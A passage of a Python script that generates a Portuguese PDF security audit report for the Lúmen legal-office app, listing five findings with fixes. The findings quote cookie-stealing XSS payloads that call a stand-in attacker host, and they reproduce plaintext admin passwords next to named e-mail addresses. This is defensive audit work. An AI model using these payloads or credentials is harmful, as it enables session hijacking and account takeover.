#!/usr/bin/env python3
"""Gera o Relatório de Auditoria de Segurança do Lúmen em PDF.

Uso:
    docs/security-audit/.venv/bin/python docs/security-audit/gerar_relatorio.py

Regenerar depois de uma nova rodada de auditoria: edite a lista FINDINGS (e,
se necessário, STRENGTHS/RECOMMENDATIONS/ISSUES) abaixo e rode de novo — o
script sempre sobrescreve relatorio-auditoria-seguranca.pdf no mesmo diretório.
"""

import os
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import cm
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image,
    PageBreak, KeepTogether, HRFlowable, ListFlowable, ListItem,
)
from reportlab.pdfgen import canvas as pdfcanvas

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_PDF = os.path.join(HERE, "relatorio-auditoria-seguranca.pdf")
CHART_DONUT = os.path.join(HERE, "_chart_donut.png")
CHART_BARS = os.path.join(HERE, "_chart_bars.png")

# ---------------------------------------------------------------------------
# Paleta
# ---------------------------------------------------------------------------
COR_CRITICA = "#B91C1C"
COR_ALTA = "#EA580C"
COR_MEDIA = "#D97706"
COR_BAIXA = "#2563EB"
COR_PONTO_FORTE = "#059669"
COR_TEXTO = "#1F2933"
COR_TEXTO_2 = "#52606D"
COR_LINHA = "#D9DEE4"
COR_FUNDO_CAPA = "#0F1F3D"

SEV_COLOR = {
    "Crítica": COR_CRITICA,
    "Alta": COR_ALTA,
    "Média": COR_MEDIA,
    "Baixa": COR_BAIXA,
    "Informativa": COR_PONTO_FORTE,
}
SEV_ORDER = ["Crítica", "Alta", "Média", "Baixa", "Informativa"]


def esc(s: str) -> str:
    """Escapa &, < e > de texto simples antes de virar Paragraph do reportlab —
    necessário porque vários trechos citam literalmente <a href>, <input type="url">,
    <img ...> etc, que o parser de mini-XML do reportlab tentaria interpretar como tag."""
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

REPORT_NAME = "Relatório de Auditoria de Segurança — Lúmen"
PROJECT_NAME = "Lúmen"
REPO = "rodartepradoadvogados/lumen"
AUDIT_DATE = "01 de setembro de 2026"

# ---------------------------------------------------------------------------
# Dados da auditoria (achados verificados)
# ---------------------------------------------------------------------------
FINDINGS = [
    {
        "id": "F1",
        "categoria": "3. IDOR",
        "severidade": "Baixa",
        "arquivo": "app/api/perfil/foto/[userId]/route.ts:10-16",
        "titulo": "Rota de foto de perfil sem exigir sessão autenticada",
        "descricao": (
            "A rota busca a foto de perfil de QUALQUER usuário da plataforma a partir de um "
            "userId na URL, sem chamar getCurrentUser() e sem checar officeId — é a única rota "
            "sensível do sistema, entre 113 arquivos auditados, sem nenhuma verificação de sessão."
        ),
        "trecho": (
            "export async function GET(_request: Request, { params }: { params: { userId: string } }) {\n"
            "  const user = await prisma.user.findUnique({ where: { id: params.userId }, select: { photoUrl: true } });\n"
            "  if (!user?.photoUrl) return new Response(\"Foto não encontrada\", { status: 404 });\n"
            "  return NextResponse.redirect(user.photoUrl);\n"
            "}"
        ),
        "exploracao": (
            "Qualquer requisição HTTP, mesmo sem login algum, com um userId (CUID) válido de "
            "qualquer escritório-cliente da plataforma, recebe um redirect 302 para a URL pública "
            "da foto de perfil daquele usuário — confirma a existência do ID e vaza dado pessoal "
            "cross-tenant sem qualquer credencial."
        ),
        "condicoes": "Nenhuma — a única condição é conhecer/adivinhar um userId (CUID) válido.",
        "correcao": "Adicionar `const viewer = await getCurrentUser(); if (!viewer) return new Response(null, { status: 401 });` no início do handler.",
    },
    {
        "id": "F2",
        "categoria": "4. Segredos expostos",
        "severidade": "Alta",
        "arquivo": "lib/whatsapp.ts:148-150 (usado por app/api/whatsapp/route.ts)",
        "titulo": "Verificação de assinatura do webhook do WhatsApp falha aberta sem WHATSAPP_APP_SECRET",
        "descricao": (
            "verifySignature() retorna true (assinatura válida) quando a variável de ambiente "
            "WHATSAPP_APP_SECRET não está configurada, em vez de recusar a requisição — padrão "
            "oposto ao do webhook do Asaas (fail-closed) e ao do próprio AUTH_SECRET do projeto."
        ),
        "trecho": (
            "export function verifySignature(rawBody: string, signatureHeader: string | null): boolean {\n"
            "  const secret = process.env.WHATSAPP_APP_SECRET;\n"
            "  if (!secret) return true; // sem secret configurado → não valida\n"
            "  ..."
        ),
        "exploracao": (
            "O .env.example documenta essa variável como opcional (\"deixe em branco para manter a "
            "integração dormente\"). Se ficar ausente em produção enquanto o módulo WhatsApp de um "
            "escritório real já está ativo (phoneNumberId cadastrado em WhatsappConfig), qualquer "
            "requisição POST não autenticada para /api/whatsapp com esse phone_number_id é aceita "
            "como mensagem legítima — permitindo forjar mensagens em conversas de Atendimento de um "
            "escritório real, sem nenhuma credencial."
        ),
        "condicoes": "WHATSAPP_APP_SECRET ausente em produção (estado documentado como aceitável) + módulo WhatsApp ativo em ao menos um escritório.",
        "correcao": "Inverter o padrão para fail-closed: recusar (401) quando o secret não estiver configurado, igual ao webhook do Asaas.",
    },
    {
        "id": "F3",
        "categoria": "4. Segredos expostos",
        "severidade": "Alta",
        "arquivo": "prisma/seed.ts:43-68",
        "titulo": "Senhas reais em texto puro versionadas no histórico do git",
        "descricao": (
            "O script de seed cria contas de administrador com nome, e-mail e número de OAB reais "
            "dos sócios do escritório, com senhas fracas e previsíveis em texto puro hardcoded no "
            "código-fonte."
        ),
        "trecho": (
            "email: \"jairo@rodarteprado.com.br\", ... passwordHash: await bcrypt.hash(\"Goiabada1#\", 10), isAdmin: true,\n"
            "email: \"rodrigo@rodarteprado.com.br\", ... passwordHash: await bcrypt.hash(\"Goiabada1\", 10), isAdmin: true,"
        ),
        "exploracao": (
            "Qualquer pessoa com acesso de leitura ao repositório tem, em texto puro e permanentemente "
            "no histórico do git, uma senha fraca associada a uma identidade real e a um e-mail real "
            "de administrador do sistema — risco de reuso de senha e de credencial ativa caso o seed "
            "seja executado contra um banco alcançável."
        ),
        "condicoes": "Acesso de leitura ao repositório (interno ou por vazamento) + reuso da senha em algum ambiente real, ou execução do seed contra um banco acessível.",
        "correcao": "Gerar senha aleatória por execução (ou ler de variável de ambiente só de desenvolvimento) em vez de valor fixo associado a pessoa real; considerar reescrever o histórico do git para remover as senhas atuais.",
    },
    {
        "id": "F4",
        "categoria": "5. XSS / Input sem tratamento",
        "severidade": "Média",
        "arquivo": "lib/email.ts:536-541; lib/actions/tasks.ts:452; lib/notificationOutboxDrain.ts:30-33; lib/comunicadosVarredura.ts",
        "titulo": "Texto de usuário interpolado sem escape em HTML de e-mail",
        "descricao": (
            "Comentários com @menção (addComment, sem nenhuma sanitização), títulos/descrições de "
            "tarefa e nomes de cliente — todos texto livre digitável por qualquer usuário do "
            "escritório — são interpolados diretamente em templates HTML de e-mail (resumo diário, "
            "notificação de menção, comunicados) sem escapar `<`, `>` ou `&`."
        ),
        "trecho": (
            "content: data.content,  // lib/actions/tasks.ts:452 — sem sanitizeRichTextHtml\n"
            "`<p ...>${i.title}</p>${i.subtitle ? `<p ...>${i.subtitle}</p>` : \"\"}`  // lib/email.ts:536-541"
        ),
        "exploracao": (
            "Um usuário escreve um comentário como '@Maria <img src=x onerror=fetch(...+document.cookie)>'; "
            "o conteúdo é gravado sem sanitização e, no próximo resumo diário da pessoa mencionada, "
            "injetado cru no HTML do e-mail. Clientes de e-mail que renderizam HTML e não bloqueiam "
            "onerror executam o payload; mesmo quando bloqueiam scripts, permanece um vetor de phishing "
            "(links/botões falsos)."
        ),
        "condicoes": "Qualquer usuário autenticado do escritório (não precisa ser admin) + destinatário do e-mail com cliente que renderize HTML.",
        "correcao": "Escapar `<`, `>`, `&` de todo valor de usuário antes de interpolar em HTML de e-mail — idealmente um helper escapeHtml() central usado por lib/email.ts, lib/notificationOutboxDrain.ts e lib/comunicadosVarredura.ts.",
    },
    {
        "id": "F5",
        "categoria": "5. XSS / Input sem tratamento",
        "severidade": "Alta",
        "arquivo": "components/AgendaView.tsx:727 (Task.meetingUrl); app/(app)/processos/[id]/page.tsx:487 (Case.tribunalLink)",
        "titulo": "Protocolo javascript: não bloqueado em campos de URL — XSS armazenado",
        "descricao": (
            "Os campos Task.meetingUrl (link de reunião) e Case.tribunalLink (link do sistema do "
            "tribunal/órgão) são preenchidos livremente pelo usuário via <input type=\"url\"> — que "
            "não recusa o esquema javascript: — e renderizados direto em <a href> sem validar o "
            "protocolo, tanto na gravação (Server Action) quanto na renderização."
        ),
        "trecho": (
            "<a href={t.meetingUrl} target=\"_blank\" rel=\"noopener noreferrer\">🔗 {t.meetingUrl}</a>\n"
            "<a href={c.tribunalLink} target=\"_blank\" rel=\"noopener noreferrer\">↗ Acessar sistema do tribunal</a>"
        ),
        "exploracao": (
            "Um usuário com permissão de criar/editar Processo ou Tarefa define o link como "
            "'javascript:fetch(\"https://atacante/roubo?c=\"+document.cookie)'. Um colega que clique "
            "executa o script no contexto autenticado do Lúmen (cookie de sessão, chamadas à API). No "
            "caso do tribunalLink o botão tem texto fixo — a vítima nunca vê a URL real antes de clicar."
        ),
        "condicoes": "Requer clique da vítima (não é zero-click); usuário malicioso precisa ter permissão de criar/editar Processo ou Tarefa (não é restrito a admin na maioria dos escritórios).",
        "correcao": "Validar o protocolo (permitir só http:/https:) tanto ao salvar (Server Action) quanto ao renderizar, recusando ou neutralizando qualquer outro esquema.",
    },
]

STRENGTHS = [
    ("1. Isolamento de tenant", "113 de 113 arquivos auditados (58 lib/actions/*.ts + 55 app/api/**/route.ts) filtram consistentemente por officeId; os helpers isXInOffice de lib/officeScope.ts são usados sistematicamente antes de vincular qualquer FK secundária vinda do cliente. Nenhum uso de $queryRaw/$executeRaw nesses diretórios."),
    ("2. Permissões no servidor", "Nenhum achado. Todas as 13 rotas app/api/admin/* e as 14 rotas de cron exigem isPlatformOwner/isAdmin e/ou um segredo de ambiente fail-closed. As Server Actions financeiras e de gestão de equipe revalidam isAdmin/financeAccess no servidor mesmo com a UI já escondendo os controles."),
    ("3. IDOR", "Mesma cobertura de 113 arquivos; toda função de exclusão, baixa de pagamento, conclusão de tarefa e arquivamento confirma posse via officeId antes de agir — a única exceção é o Achado F1 (severidade baixa)."),
    ("4. Segredos", "AUTH_SECRET, CRON_SECRET (13 rotas), ASAAS_WEBHOOK_TOKEN, MIGRATION_SECRET e PAINEL_MESTRE_SETUP_SECRET seguem disciplina fail-closed correta. Nenhum arquivo .env real foi commitado no histórico do git (39 commits, cobertura de 100%); nenhum client secret OAuth hardcoded — todos vêm de process.env."),
    ("5. XSS", "sanitizeRichTextHtml (lib/richText.ts) é aplicado corretamente no único ponto de escrita de Anotacao.content e de Task.description. Nenhuma ocorrência de eval()/new Function() em todo o código-fonte. Projeto não usa biblioteca de Markdown."),
]

RECOMMENDATIONS = [
    ("P1", "Inverter o webhook do WhatsApp (lib/whatsapp.ts) para fail-closed quando WHATSAPP_APP_SECRET estiver ausente — hoje é o único ponto de entrada externo do sistema que aceita dado não autenticado por padrão.", "F2"),
    ("P1", "Validar o protocolo de Task.meetingUrl e Case.tribunalLink (permitir só http:/https:) antes de salvar e ao renderizar como link clicável.", "F5"),
    ("P1", "Remover as senhas reais de prisma/seed.ts e gerar credenciais aleatórias por execução; avaliar necessidade de reescrever o histórico do git.", "F3"),
    ("P2", "Criar um helper central de escape de HTML e aplicá-lo em todos os pontos de montagem de e-mail (lib/email.ts, lib/notificationOutboxDrain.ts, lib/comunicadosVarredura.ts) que interpolam texto livre de usuário.", "F4"),
    ("P2", "Exigir sessão autenticada (getCurrentUser) em app/api/perfil/foto/[userId]/route.ts.", "F1"),
    ("P3", "Documentar como padrão de engenharia que todo novo endpoint de webhook/integração externa deve ser fail-closed por padrão (seguindo o modelo já usado por CRON_SECRET e ASAAS_WEBHOOK_TOKEN).", "—"),
    ("P3", "Adicionar um lint/CI check que sinalize qualquer dangerouslySetInnerHTML novo para revisão manual, dado o baixo número atual (4 ocorrências) e o valor de manter essa disciplina.", "—"),
]

ISSUES = [
    {
        "titulo": "[Segurança] Webhook do WhatsApp aceita requisições não autenticadas quando WHATSAPP_APP_SECRET não está configurado",
        "labels": "security, alta",
        "corpo": (
            "## Problema\n\n"
            "`verifySignature()` em `lib/whatsapp.ts:148-150` retorna `true` (assinatura válida) quando "
            "a variável de ambiente `WHATSAPP_APP_SECRET` não está configurada, em vez de recusar a "
            "requisição. Essa função protege `app/api/whatsapp/route.ts`, a rota que ingere mensagens "
            "externas via `ingestIncomingWhatsapp` e cria/atualiza `Attendance`/`WhatsappMessage` no "
            "banco de um escritório real.\n\n"
            "É explorável porque o `.env.example` documenta essa variável como opcional (\"deixe em "
            "branco para manter a integração dormente\") — ou seja, o estado \"ausente em produção\" é "
            "tratado como aceitável no projeto, mas na prática deixa a rota aceitando POSTs não "
            "autenticados sempre que um escritório já tiver ativado o módulo WhatsApp (com um "
            "`phoneNumberId` cadastrado).\n\n"
            "## Evidência\n\n"
            "`lib/whatsapp.ts:148-150`\n"
            "```ts\n"
            "export function verifySignature(rawBody: string, signatureHeader: string | null): boolean {\n"
            "  const secret = process.env.WHATSAPP_APP_SECRET;\n"
            "  if (!secret) return true; // sem secret configurado → não valida\n"
            "  ...\n"
            "```\n\n"
            "## Impacto\n\n"
            "Um atacante sem nenhuma credencial pode enviar requisições forjadas para `/api/whatsapp` "
            "com um `phone_number_id` válido e injetar mensagens em conversas de Atendimento de um "
            "escritório real, contaminando o histórico de comunicação com clientes.\n\n"
            "## Sugestão de correção\n\n"
            "Inverter o padrão para fail-closed, igual ao webhook do Asaas (`ASAAS_WEBHOOK_TOKEN`, "
            "`lib/asaas.ts`): recusar (401) quando `WHATSAPP_APP_SECRET` não estiver configurado, em "
            "vez de aceitar tudo.\n\n"
            "## Critérios de aceite\n\n"
            "- [ ] `verifySignature()` retorna `false` quando `WHATSAPP_APP_SECRET` está ausente\n"
            "- [ ] `app/api/whatsapp/route.ts` responde 401/403 quando a assinatura é inválida ou ausente\n"
            "- [ ] Documentação (`.env.example`, README relevante) deixa de descrever a variável como \"opcional\"\n"
            "- [ ] Teste automatizado cobrindo o caso \"secret ausente → requisição recusada\""
        ),
    },
    {
        "titulo": "[Segurança] Senhas reais em texto puro versionadas em prisma/seed.ts",
        "labels": "security, alta",
        "corpo": (
            "## Problema\n\n"
            "`prisma/seed.ts:43-68` cria contas de administrador com nome, e-mail e número de OAB "
            "reais dos sócios do escritório, com senhas fracas e previsíveis em texto puro hardcoded "
            "diretamente no código-fonte, versionadas permanentemente no histórico do git.\n\n"
            "## Evidência\n\n"
            "`prisma/seed.ts:52` e `prisma/seed.ts:65`\n"
            "```ts\n"
            "email: \"jairo@rodarteprado.com.br\", ... passwordHash: await bcrypt.hash(\"Goiabada1#\", 10), isAdmin: true,\n"
            "email: \"rodrigo@rodarteprado.com.br\", ... passwordHash: await bcrypt.hash(\"Goiabada1\", 10), isAdmin: true,\n"
            "```\n\n"
            "## Impacto\n\n"
            "Qualquer pessoa com acesso de leitura ao repositório tem, em texto puro, uma senha fraca "
            "associada à identidade real de administradores do sistema. Risco de reuso de senha em "
            "outro ambiente e de credencial ativa e conhecida publicamente caso o seed seja executado "
            "contra um banco acessível (dev/staging compartilhado, por exemplo).\n\n"
            "## Sugestão de correção\n\n"
            "Gerar senha aleatória a cada execução do seed (ou ler de uma variável de ambiente só de "
            "desenvolvimento, nunca commitada) em vez de valor fixo ligado a pessoa real. Avaliar, à "
            "parte, se vale reescrever o histórico do git para remover as senhas atuais (rotacionando "
            "as senhas reais dessas contas como precaução, já que o hash + a senha em claro convivem "
            "no mesmo repositório).\n\n"
            "## Critérios de aceite\n\n"
            "- [ ] `prisma/seed.ts` não contém mais senha literal associada a pessoa real\n"
            "- [ ] Senha de seed passa a ser gerada aleatoriamente ou lida de env var de desenvolvimento\n"
            "- [ ] Senhas reais das contas de Jairo e Rodrigo são rotacionadas em produção como precaução"
        ),
    },
    {
        "titulo": "[Segurança] javascript: não bloqueado em campos de URL de usuário (meetingUrl, tribunalLink) — XSS armazenado",
        "labels": "security, alta",
        "corpo": (
            "## Problema\n\n"
            "Os campos `Task.meetingUrl` (link de reunião online) e `Case.tribunalLink` (link do "
            "sistema do tribunal/órgão) são preenchidos livremente pelo usuário via `<input "
            "type=\"url\">` — que não recusa o esquema `javascript:` — e são gravados e renderizados "
            "diretamente em `<a href>` sem qualquer validação de protocolo, nem ao salvar nem ao "
            "exibir.\n\n"
            "## Evidência\n\n"
            "`components/AgendaView.tsx:727`\n"
            "```tsx\n"
            "<a href={t.meetingUrl} target=\"_blank\" rel=\"noopener noreferrer\">🔗 {t.meetingUrl}</a>\n"
            "```\n"
            "`app/(app)/processos/[id]/page.tsx:485-493`\n"
            "```tsx\n"
            "<a href={c.tribunalLink} target=\"_blank\" rel=\"noopener noreferrer\">\n"
            "  <ExternalLink size={12} /> Acessar sistema do tribunal\n"
            "</a>\n"
            "```\n"
            "Gravação sem validação em `lib/actions/tasks.ts:113,199,420` (`meetingUrl`) e "
            "`lib/actions/cases.ts:269,385,600,746` (`tribunalLink`).\n\n"
            "## Impacto\n\n"
            "Um usuário com permissão de criar/editar Processo ou Tarefa define o campo como "
            "`javascript:fetch('https://atacante.exemplo/roubo?c='+document.cookie)`. Qualquer colega "
            "que clique no link executa o script no contexto autenticado do Lúmen (cookies de sessão, "
            "chamadas à API), com risco de sequestro de sessão. No caso do `tribunalLink` o botão tem "
            "texto fixo genérico — a vítima nunca vê a URL real antes de clicar, o que aumenta a chance "
            "de clique.\n\n"
            "## Sugestão de correção\n\n"
            "Validar o protocolo (permitir só `http:`/`https:`) tanto no servidor, ao salvar "
            "(`lib/actions/tasks.ts`, `lib/actions/cases.ts`), quanto — como defesa em profundidade — "
            "ao renderizar o link.\n\n"
            "## Critérios de aceite\n\n"
            "- [ ] Server Actions que gravam `meetingUrl`/`tribunalLink` rejeitam ou neutralizam "
            "qualquer protocolo diferente de http:/https:\n"
            "- [ ] Registros já existentes com protocolo inseguro são identificados/corrigidos (migração de dado)\n"
            "- [ ] Teste automatizado cobrindo submissão de `javascript:...` nesses dois campos"
        ),
    },
    {
        "titulo": "[Segurança] Conteúdo de usuário interpolado sem escape em e-mails HTML (comentários, tarefas, comunicados)",
        "labels": "security, média",
        "corpo": (
            "## Problema\n\n"
            "Texto livre digitado por qualquer usuário do escritório — comentários com `@menção` "
            "(sem nenhuma sanitização em `addComment`), título/descrição de tarefa e nome de cliente "
            "— é interpolado diretamente em templates HTML de e-mail (resumo diário, notificação de "
            "menção, comunicados automáticos) sem escapar `<`, `>` ou `&`.\n\n"
            "## Evidência\n\n"
            "`lib/actions/tasks.ts:452` — grava sem sanitização:\n"
            "```ts\n"
            "const comment = await prisma.comment.create({ data: { content: data.content, ... } });\n"
            "```\n"
            "`lib/email.ts:536-541` (`digestSection`) — interpola cru:\n"
            "```ts\n"
            "`<p ...>${i.title}</p>${i.subtitle ? `<p ...>${i.subtitle}</p>` : \"\"}`\n"
            "```\n"
            "Mesmo padrão em `lib/notificationOutboxDrain.ts:30-33` e nos eventos de "
            "`lib/comunicadosVarredura.ts` (PRAZO_HOJE, AUDIENCIA_24H, HONORARIO_A_RECEBER etc.), que "
            "usam `lib/emailTemplateRender.ts:53-84`.\n\n"
            "## Impacto\n\n"
            "Um usuário insere um comentário como `@Maria <img src=x onerror=fetch('https://atacante/x?c='+document.cookie)>`. "
            "No próximo resumo diário enviado à pessoa mencionada, o payload é injetado cru no HTML do "
            "e-mail. Em clientes de e-mail que renderizam HTML e não bloqueiam `onerror`, o script "
            "executa; mesmo quando bloqueiam, o vetor permanece útil para phishing (links/botões "
            "falsos disfarçados de notificação legítima do Lúmen).\n\n"
            "## Sugestão de correção\n\n"
            "Criar um helper central `escapeHtml()` e aplicá-lo a todo valor de usuário antes de "
            "interpolar em HTML de e-mail, nos três pontos listados acima.\n\n"
            "## Critérios de aceite\n\n"
            "- [ ] Helper `escapeHtml()` criado e testado (cobre `<`, `>`, `&`, aspas)\n"
            "- [ ] `lib/email.ts`, `lib/notificationOutboxDrain.ts` e `lib/comunicadosVarredura.ts` "
            "aplicam o helper a todo campo de texto livre de usuário\n"
            "- [ ] Teste automatizado confirmando que um comentário com HTML malicioso chega escapado "
            "no corpo do e-mail gerado"
        ),
    },
    {
        "titulo": "[Segurança] Rota de foto de perfil não exige autenticação",
        "labels": "security, baixa",
        "corpo": (
            "## Problema\n\n"
            "`app/api/perfil/foto/[userId]/route.ts` busca a foto de perfil de qualquer usuário da "
            "plataforma a partir do `userId` na URL, sem chamar `getCurrentUser()` nem checar "
            "`officeId` — é a única rota sensível do sistema, entre 113 arquivos auditados "
            "(58 Server Actions + 55 rotas de API), sem nenhuma verificação de sessão.\n\n"
            "## Evidência\n\n"
            "`app/api/perfil/foto/[userId]/route.ts:10-16`\n"
            "```ts\n"
            "export async function GET(_request: Request, { params }: { params: { userId: string } }) {\n"
            "  const user = await prisma.user.findUnique({ where: { id: params.userId }, select: { photoUrl: true } });\n"
            "  if (!user?.photoUrl) return new Response(\"Foto não encontrada\", { status: 404 });\n"
            "  return NextResponse.redirect(user.photoUrl);\n"
            "}\n"
            "```\n\n"
            "## Impacto\n\n"
            "Qualquer requisição, mesmo sem login, para um `userId` (CUID) válido de qualquer "
            "escritório-cliente recebe um redirect para a foto de perfil daquele usuário — confirma a "
            "existência do ID e vaza dado pessoal cross-tenant sem qualquer credencial. Impacto "
            "prático limitado (o Blob Store do projeto já é público por design e o CUID não é "
            "enumerável em sequência), mas é uma quebra do padrão de segurança seguido em todo o "
            "restante do código.\n\n"
            "## Sugestão de correção\n\n"
            "Adicionar `const viewer = await getCurrentUser(); if (!viewer) return new Response(null, "
            "{ status: 401 });` no início do handler — não é necessário restringir por `officeId`, "
            "apenas exigir sessão válida.\n\n"
            "## Critérios de aceite\n\n"
            "- [ ] Rota retorna 401 para requisição sem sessão válida\n"
            "- [ ] Comportamento para usuário autenticado permanece inalterado"
        ),
    },
]

METHODOLOGY = [
    ("Banco sem tranca (isolamento de tenant)", "Sem RLS (Postgres puro via Prisma, sem Supabase). Mapeado como: toda query Prisma que devolve dado precisa filtrar por `officeId` do usuário autenticado, direto ou via relação; validado sistematicamente nos 58 arquivos lib/actions/*.ts e 55 arquivos app/api/**/route.ts."),
    ("Permissão definida no navegador", "Auth própria via JWT (lib/auth.ts) + Server Components/Actions do App Router — o \"servidor\" é o corpo da própria Server Action ou do handler de rota, não um middleware separado. Cruzado todo gate de UI (isAdmin/isPlatformOwner/financeAccess) com a validação correspondente na Server Action/rota chamada."),
    ("IDOR", "Toda função que recebe um id/xxxId e faz update/delete/find deve validar posse via where com officeId, um findFirst prévio com officeId, ou um helper isXInOffice de lib/officeScope.ts."),
    ("Chaves expostas", "Sem Docker/Helm/Terraform neste repositório (deploy via Vercel, vercel.json). Mapeado como: grep por padrões de chave em código/config/docs, auditoria de defaults inseguros em process.env.X, e varredura do histórico do git (100% dos 39 commits)."),
    ("Inputs sem tratamento (XSS)", "Frontend React (Next.js App Router) — mapeado como dangerouslySetInnerHTML, href/src de URL controlada pelo usuário, eval/new Function; e, no backend, interpolação de dado de usuário em templates HTML de e-mail sem escape."),
]

# ---------------------------------------------------------------------------
# Gráficos
# ---------------------------------------------------------------------------

def make_donut():
    counts = {s: 0 for s in SEV_ORDER}
    for f in FINDINGS:
        counts[f["severidade"]] += 1
    labels, sizes, colors_ = [], [], []
    for s in SEV_ORDER:
        if counts[s] > 0:
            labels.append(f"{s} ({counts[s]})")
            sizes.append(counts[s])
            colors_.append(SEV_COLOR[s])

    fig, ax = plt.subplots(figsize=(4.6, 4.6), dpi=200)
    wedges, _ = ax.pie(
        sizes, colors=colors_, startangle=90, counterclock=False,
        wedgeprops=dict(width=0.42, edgecolor="white", linewidth=2),
    )
    ax.set_aspect("equal")
    total = sum(sizes)
    ax.text(0, 0.08, str(total), ha="center", va="center", fontsize=30, fontweight="bold", color=COR_TEXTO)
    ax.text(0, -0.20, "achados", ha="center", va="center", fontsize=11, color=COR_TEXTO_2)
    ax.legend(wedges, labels, loc="center", bbox_to_anchor=(0.5, -0.14), ncol=2,
              frameon=False, fontsize=9, labelcolor=COR_TEXTO)
    fig.tight_layout()
    fig.savefig(CHART_DONUT, transparent=True)
    plt.close(fig)


def make_bars():
    cat_labels = ["1. Tenant", "2. Permissão", "3. IDOR", "4. Segredos", "5. XSS"]
    cat_keys = ["1.", "2.", "3.", "4.", "5."]
    counts_by_sev = {s: [0] * 5 for s in SEV_ORDER}
    for f in FINDINGS:
        idx = cat_keys.index(f["categoria"].split(".")[0] + ".")
        counts_by_sev[f["severidade"]][idx] += 1

    fig, ax = plt.subplots(figsize=(7.2, 4.2), dpi=200)
    bottom = [0] * 5
    for s in SEV_ORDER:
        vals = counts_by_sev[s]
        if sum(vals) == 0:
            continue
        ax.bar(cat_labels, vals, bottom=bottom, color=SEV_COLOR[s], label=s, width=0.55)
        for i, v in enumerate(vals):
            if v > 0:
                ax.text(i, bottom[i] + v / 2, str(v), ha="center", va="center",
                         fontsize=10, fontweight="bold", color="white")
        bottom = [b + v for b, v in zip(bottom, vals)]

    max_total = max(bottom) if bottom else 1
    ax.set_ylim(0, max(max_total + 1, 2))
    ax.set_yticks(range(0, int(max_total) + 2))
    ax.spines[["top", "right"]].set_visible(False)
    ax.spines[["left", "bottom"]].set_color(COR_LINHA)
    ax.tick_params(colors=COR_TEXTO_2, labelsize=9)
    ax.legend(loc="upper right", frameon=False, fontsize=9, labelcolor=COR_TEXTO)
    ax.set_ylabel("Achados", fontsize=9, color=COR_TEXTO_2)
    fig.tight_layout()
    fig.savefig(CHART_BARS, transparent=True)
    plt.close(fig)


# ---------------------------------------------------------------------------
# Estilos
# ---------------------------------------------------------------------------

def build_styles():
    ss = getSampleStyleSheet()
    styles = {}
    styles["H1"] = ParagraphStyle("H1", parent=ss["Heading1"], fontName="Helvetica-Bold",
                                   fontSize=18, textColor=colors.HexColor(COR_TEXTO),
                                   spaceBefore=4, spaceAfter=12)
    styles["H2"] = ParagraphStyle("H2", parent=ss["Heading2"], fontName="Helvetica-Bold",
                                   fontSize=13.5, textColor=colors.HexColor(COR_FUNDO_CAPA),
                                   spaceBefore=16, spaceAfter=8)
    styles["H3"] = ParagraphStyle("H3", parent=ss["Heading3"], fontName="Helvetica-Bold",
                                   fontSize=11, textColor=colors.HexColor(COR_TEXTO),
                                   spaceBefore=10, spaceAfter=4)
    styles["Body"] = ParagraphStyle("Body", parent=ss["BodyText"], fontName="Helvetica",
                                     fontSize=9.3, leading=13.5, textColor=colors.HexColor(COR_TEXTO),
                                     alignment=TA_JUSTIFY, spaceAfter=6)
    styles["BodySmall"] = ParagraphStyle("BodySmall", parent=styles["Body"], fontSize=8.4, leading=12)
    styles["Mono"] = ParagraphStyle("Mono", parent=ss["Code"], fontName="Courier",
                                     fontSize=7.6, leading=10.4, textColor=colors.HexColor("#0F1F3D"),
                                     backColor=colors.HexColor("#F3F4F6"), borderPadding=6,
                                     leftIndent=2, spaceAfter=6)
    styles["Cover_Title"] = ParagraphStyle("Cover_Title", fontName="Helvetica-Bold", fontSize=28,
                                            leading=34, textColor=colors.white, alignment=TA_LEFT)
    styles["Cover_Sub"] = ParagraphStyle("Cover_Sub", fontName="Helvetica", fontSize=12.5,
                                          leading=18, textColor=colors.HexColor("#C9D3E0"), alignment=TA_LEFT)
    styles["Cover_Meta"] = ParagraphStyle("Cover_Meta", fontName="Helvetica", fontSize=9.5,
                                           leading=14, textColor=colors.HexColor("#9FB0C7"), alignment=TA_LEFT)
    styles["Center"] = ParagraphStyle("Center", parent=styles["Body"], alignment=TA_CENTER)
    return styles


# ---------------------------------------------------------------------------
# Header / footer / capa
# ---------------------------------------------------------------------------
PAGE_W, PAGE_H = A4
MARGIN = 2 * cm


def on_page(canvas: pdfcanvas.Canvas, doc, cover=False):
    canvas.saveState()
    if cover:
        canvas.setFillColor(colors.HexColor(COR_FUNDO_CAPA))
        canvas.rect(0, 0, PAGE_W, PAGE_H, fill=1, stroke=0)
        canvas.restoreState()
        return
    # cabeçalho
    canvas.setFont("Helvetica", 8)
    canvas.setFillColor(colors.HexColor(COR_TEXTO_2))
    canvas.drawString(MARGIN, PAGE_H - 1.35 * cm, REPORT_NAME)
    canvas.drawRightString(PAGE_W - MARGIN, PAGE_H - 1.35 * cm, PROJECT_NAME)
    canvas.setStrokeColor(colors.HexColor(COR_LINHA))
    canvas.setLineWidth(0.6)
    canvas.line(MARGIN, PAGE_H - 1.5 * cm, PAGE_W - MARGIN, PAGE_H - 1.5 * cm)
    # rodapé
    canvas.line(MARGIN, 1.5 * cm, PAGE_W - MARGIN, 1.5 * cm)
    canvas.setFont("Helvetica", 8)
    canvas.drawString(MARGIN, 1.15 * cm, "Confidencial — uso interno")
    canvas.drawRightString(PAGE_W - MARGIN, 1.15 * cm, f"Página {doc.page}")
    canvas.restoreState()


def on_page_cover(canvas, doc):
    on_page(canvas, doc, cover=True)


def on_page_normal(canvas, doc):
    on_page(canvas, doc, cover=False)


# ---------------------------------------------------------------------------
# Conteúdo
# ---------------------------------------------------------------------------

def sev_chip(sev):
    color = SEV_COLOR.get(sev, COR_TEXTO_2)
    t = Table([[sev]], colWidths=[2.2 * cm], rowHeights=[0.55 * cm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(color)),
        ("TEXTCOLOR", (0, 0), (-1, -1), colors.white),
        ("FONTNAME", (0, 0), (-1, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 8),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
